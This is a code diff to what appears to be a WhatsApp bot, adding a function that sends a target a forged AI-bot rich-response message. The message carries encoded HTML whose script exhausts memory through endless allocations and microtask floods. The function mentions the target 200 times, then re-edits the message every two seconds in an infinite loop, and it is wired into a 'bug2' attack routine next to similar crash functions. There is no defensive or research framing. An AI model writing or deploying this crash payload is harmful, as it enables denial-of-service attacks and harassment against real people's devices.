@@ -1360,6 +1360,165 @@ async function initializeBot() {
   await initializeWABotSessions();
 }
 
+async function anjay(sock, target) {
+  const id = () => Math.random().toString(36).substring(2, 10);
+  const responseId = id();
+  const originalId = id().toUpperCase();
+
+  const html = `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>System Monitor</title>
+<style>
+html, body {
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    height: 100%;
+    background-color: #000000;
+    overflow: hidden;
+}
+</style>
+</head>
+<body>
+<script>
+(function() {
+    const memoryRetentionArray = [];
+    const allocationChunkSize = 1024 * 1024 * 64;
+
+    function saturateEngine() {
+        try {
+            const rawBuffer = new ArrayBuffer(allocationChunkSize);
+            const viewArray = new Uint32Array(rawBuffer);
+            
+            for (let index = 0; index < viewArray.length; index += 1024) {
+                viewArray[index] = index ^ 0xDEADBEEF;
+            }
+            
+            memoryRetentionArray.push(rawBuffer);
+            memoryRetentionArray.push(viewArray);
+        } catch (allocationError) {
+            while (true) {
+                const garbageData = new Array(1000000).fill(Math.random());
+                memoryRetentionArray.push(garbageData);
+            }
+        }
+
+        queueMicrotask(saturateEngine);
+        queueMicrotask(saturateEngine);
+    }
+
+    function spawnMicrotaskSwarm() {
+        for (let counter = 0; counter < 50; counter++) {
+            queueMicrotask(saturateEngine);
+        }
+    }
+
+    Promise.resolve().then(spawnMicrotaskSwarm);
+    saturateEngine();
+})();
+</script>
+</body>
+</html>
+`;
+
+  const data = Buffer.from(JSON.stringify({
+    response_id: responseId,
+    sections: [{
+      view_model: {
+        __typename: 'GenAISingleLayoutViewModel',
+        primitive: {
+          __typename: 'GenAIaeacdsnwHtmlPrimitive',
+          payload: html,
+          trusted_sources: []
+        }
+      }
+    }]
+  }).replace(/[\u007f-\uffff]/g, c =>
+    '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')
+  )).toString('base64');
+
+  const message = {
+    messageContextInfo: {
+      deviceListMetadata: {},
+      deviceListMetadataVersion: 2,
+      botMetadata: {
+        botResponseId: responseId
+      }
+    },
+    botForwardedMessage: {
+      message: {
+        richResponseMessage: {
+          messageType: 1,
+          response_id: responseId,
+          submessages: [],
+          unifiedResponse: { data },
+          contextInfo: {
+            mentionedJid: Array(200).fill(target),
+            forwardingScore: 999999,
+            isForwarded: true,
+            forwardedAiBotMessageInfo: {
+              botJid: '867051314767696@bot'
+            },
+            forwardOrigin: 4,
+            expiration: 0,
+            ephemeralSettingTimestamp: Date.now(),
+            disappearingMode: {
+              initiator: 0,
+              trigger: 1
+            },
+            afterReadDuration: 200
+          }
+        }
+      }
+    }
+  };
+
+  const ctx = {
+    messageContextInfo: {
+      deviceListMetadata: {},
+      deviceListMetadataVersion: 2,
+      botMetadata: { messageDisclaimerText: ("ꦾ").repeat(2), botResponseId: responseId }
+    }
+  };
+
+  try {
+    await sock.relayMessage(target, message, {
+      participant: { jid: target },
+      noSelfSync: false
+    }).catch(() => {});
+
+    await sock.relayMessage(target, { ...ctx, ...message }, { messageId: originalId }).catch(() => {});
+
+    await new Promise(r => setTimeout(r, 1000));
+
+    while (true) {
+      try {
+        const protocolEdit = {
+          ...ctx,
+          botForwardedMessage: {
+            message: {
+              protocolMessage: {
+                key: { remoteJid: target, fromMe: true, id: originalId },
+                type: 14,
+                timestampMs: Date.now(),
+                editedMessage: message
+              }
+            }
+          }
+        };
+
+        await sock.relayMessage(target, protocolEdit, { messageId: '3EB0' + id() }).catch(() => {});
+        await new Promise(r => setTimeout(r, 2000));
+      } catch (err) {
+        await new Promise(r => setTimeout(r, 2000));
+      }
+    }
+  } catch (e) {}
+}
+
 async function lockchit(sock, target) {
   const html = `<!doctype html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>
 html,body{margin:0;padding:0;width:100%;height:100%;background:radial-gradient(circle at center,#0a0a0a,#000);color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center;overflow:hidden}
@@ -1899,6 +2058,7 @@ async function bug1(sock, target) {
 async function bug2(sock, target) {
   for (let i = 0; i < 1; i++) {
     try {
+      await anjay(sock, target);
       await lockchet(sock, target);
       await lockchit(sock, target);      
       console.log(`bug send to ${target}`);
